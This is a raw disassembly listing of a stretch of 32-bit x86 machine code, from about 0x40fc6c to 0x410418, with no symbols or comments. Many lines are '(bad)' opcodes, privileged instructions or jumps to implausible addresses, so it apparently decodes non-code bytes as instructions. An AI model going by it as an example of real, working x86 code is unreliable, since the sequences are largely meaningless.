  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
